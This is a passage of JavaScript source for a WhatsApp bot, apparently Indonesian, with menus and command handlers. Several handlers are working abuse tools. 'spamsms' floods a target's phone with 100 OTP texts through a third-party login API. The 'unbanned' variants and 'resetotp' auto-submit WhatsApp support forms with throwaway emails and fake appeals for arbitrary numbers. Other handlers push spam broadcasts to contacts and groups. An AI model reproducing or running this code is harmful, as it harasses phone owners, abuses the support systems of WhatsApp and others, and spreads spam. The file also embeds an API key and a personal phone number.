𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST FITUR BOT*
${prefix}resetotp *62xx*
${prefix}unbanned *62xx*
${prefix}unbannedv2 *62xx*
${prefix}unbannedv3 *62xx*
${prefix}spamsms *62xx*
${prefix}nowa *62xx*

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// STICKER MENU
case 'stickermenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST FITUR STICKER*
${prefix}attp *text*
${prefix}sticker
${prefix}smeme
${prefix}qc *teks*
${prefix}remini

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// DOWNLOAD MENU
case 'downloadmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST FITUR DOWNLOAD*
${prefix}tiktokmp4 *link*
${prefix}tiktokmp3 *link*
${prefix}ytmp3 *link*
${prefix}startytmp3 *judul*
${prefix}yts *judul*

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// TOOLS MENU
case 'toolsmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST FITUR TOOLS*
${prefix}style *teks*
${prefix}flipqtext *teks*
${prefix}tourl *reply media*

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// ASUPAN MENU
case 'asupanmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST FITUR ASUPAN*
${prefix}tiktokgirl 
${prefix}tiktoknukthy 
${prefix}tiktokkayes
${prefix}tiktokpanrika
${prefix}tiktoknotnot
${prefix}tiktokghea
${prefix}tiktoksantuy
${prefix}paptt

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// CASE LAINNYA

case 'addplus':
if (!isCreator) return m.reply(global.nocreator)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 99999999`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await qio.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./lib/plus.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Telah Di Tambahkan Menjadi Plus!!!`)
break

case 'dellplus':
if (!isCreator) return m.reply(global.nocreator)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 99999999`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./lib/plus.json', JSON.stringify(owner))
m.reply(`Nomor ${yaki} Telah Di Hapus Dari Plus!!!`)
break

case 'listplus':
if (!isCreator) return m.reply(global.nocreator)
teksooo = '*List User Vip*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
qio.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70': case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound76': case 'sound77': case 'sound78': case 'sound79': case 'sound80': case 'sound81': case 'sound82': case 'sound83': case 'sound84': case 'sound85': case 'sound86': case 'sound87': case 'sound88': case 'sound89': case 'sound90': case 'sound91': case 'sound92': case 'sound93': case 'sound94': case 'sound95': case 'sound96': case 'sound97': case 'sound98': case 'sound99': case 'sound100': case 'sound101': case 'sound102': case 'sound103': case 'sound104': case 'sound105': case 'sound106': case 'sound107': case 'sound108': case 'sound109': case 'sound110': case 'sound111': case 'sound112': case 'sound113': case 'sound114': case 'sound115': case 'sound116': case 'sound117': case 'sound118': case 'sound119': case 'sound120': case 'sound121': case 'sound122': case 'sound123': case 'sound124': case 'sound125': case 'sound126': case 'sound127': case 'sound128': case 'sound129': case 'sound130': case 'sound131': case 'sound132': case 'sound133': case 'sound134': case 'sound135': case 'sound136': case 'sound137': case 'sound138': case 'sound139': case 'sound140': case 'sound141': case 'sound142': case 'sound143': case 'sound144': case 'sound145': case 'sound146': case 'sound147': case 'sound148': case 'sound149': case 'sound150': case 'sound151': case 'sound152': case 'sound153': case 'sound154': case 'sound155': case 'sound156': case 'sound157': case 'sound158': case 'sound159': case 'sound160': case 'sound161':
await loading()
 qioganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await qio.sendMessage(from, { audio: qioganteng, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/99999999',
title: `Lanzz`,
sourceUrl: `https://wa.me/99999999`, 
thumbnail: qioimage
}
}})
break

case 'pushkontak':{
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!qtext) return m.reply(global.notext)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
m.reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
qio.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
m.reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break

case 'bcgroup': {
if (!isCreator) return m.reply(global.nocreator)
if (!qtext) return m.reply(global.notext)
await loading()
let getGroups = await qio.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
qio.sendMessage(i, {text: `${qtext}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'hidetag': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
await loading()
qio.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

case 'kick': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qio.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
await loading()
let users = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qio.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qio.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qio.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'editsubjek': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
if (!qtext) return m.reply(global.notext)
await loading()
await qio.groupUpdateSubject(from, qtext)
}
break

case 'editdesk':{
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
if (!qtext) return m.reply(global.notext)
await loading()
await qio.groupUpdateDescription(from, qtext)
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
await loading()
let responsegg = await qio.groupInviteCode(from)
qio.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
await loading()
qio.groupRevokeInvite(from)
break

case 'public': {
if (!isCreator) return m.reply(global.nocreator)
qio.public = true
m.reply('Sukse Change To Public')
}
break

case 'self': {
if (!isCreator) return m.reply(global.nocreator)
qio.public = false
m.reply('Sukse Change To Self')
}
break

case 'unbanned': {
if (!isCreator) return m.reply(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет WhatsApp Мой номер WhatsApp был заблокирован без причины. Пожалуйста, повторно активируйте мой номер WhatsApp, так как этот номер содержит много моей личной информации, которую я храню на этом номере, а также использую этот номер для своей офисной работы, что очень важно. Пожалуйста, активируйте мой номер WhatsApp как можно скорее. Спасибо.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor!')
}
break

case 'unbannedv2': {
if (!isCreator) return m.reply(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет, поддержка WhatsApp. Несколько дней назад я открыл приложение WhatsApp, но получил уведомление о том, что моя учетная запись WhatsApp не авторизована, и попросил зарегистрировать новый номер телефона. Почему мой номер не может использовать WhatsApp? Я считаю, что я никогда не нарушал политику WhatsApp, никогда не причинял вреда другим пользователям WhatsApp и использую WhatsApp только для бизнеса своей компании. Пожалуйста, повторно активируйте мой номер WhatsApp, поскольку этот номер содержит важные данные для моего бизнеса и деятельности. Пожалуйста, обработайте мой запрос как можно быстрее.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor!')
}
break

case 'unbannedv3': {
if (!isCreator) return m.reply(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Здравствуйте, доброе утро, WhatsApp. Я пользователь WhatsApp со следующим номером ${targetnya}. У меня возникла проблема с блокировкой моего номера WhatsApp. Когда я открыл приложение WhatsApp, я получил уведомление: «Эта учетная запись не может использовать приложение WhatsApp». Раньше я отправлял сообщения в чат своей семье только во время работы. и я не считаю, что совершил какое-либо нарушение условий обслуживания WhatsApp. Приношу извинения, я рассматриваю возможность повторной активации заблокированной учетной записи WhatsApp. Спасибо`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor!')
}
break

case 'resetotp': {
if (!isCreator) return m.reply(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor!')
}
break

case 'spamsms': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
const froms = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || qtext) {
if (froms.startsWith('08')) return replyy('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY qio`);
});
}
} else replyy(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +62899999999`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break

case 'infobot':
infobot = {
image: qioimage,
caption: `*Hallo ${pushname}*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*INFO CREATOR AND BOT*
Creator: Lanz
Telegram: @XinyouXD
Whatsapp: wa.me/6285700483489
Base: V10
Versi Bot: V3
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

*SCRIPT DIKEMBANGKAN OLEH Lanz*`
}
qio.sendMessage(from, infobot)
break

case 'sticker':
 if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await qio.sendImageAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await qio.sendVideoAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else {
return m.reply`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
break

case 'attp':
if (args.length == 0) return m.reply(global.notext)
await loading()
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
qio.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break

case 'smeme':
if (!qtext) return m.reply(global.notext)
if (!quoted) throw `Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
mee = await qio.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${qtext}.png?background=${mem}`)
qio.sendImageAsSticker(from, kaytid, m, { packname: global.sticker1, author: global.sticker2 })
}
break

case 'tiktokmp4':{
if (!qtext) return m.reply( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyy("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
qio.sendMessage(from, { caption: `Lanzz!`, video: { url: data.watermark }}, {quoted:m})
})}
break

case 'inspect':{
if (!isCreator) return m.reply(global.nocreator)
if (!qtext) return m.reply('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return replyy("Link Invalid")
qio.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
replyy(tekse)
})}
break

case 'tiktokmp3':{
if (!qtext) return m.reply( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyy("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
qio.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break

case 'startytmp3':{
if (!q) return replyy(`Example : ${prefix + command} karna su sayang`)
const qioplay = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/storage2")
let yts = require("youtube-yts")
let search = await yts(q)
let anup3k = search.videos[0]
const pl= await qioplay.mp3(anup3k.url)
await qio.sendMessage(from,{
audio: fs.readFileSync(pl.path),
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anup3k.title,
body: `Lanzz`,
thumbnail: await fetchBuffer(pl.meta.image),
mediaType:2,
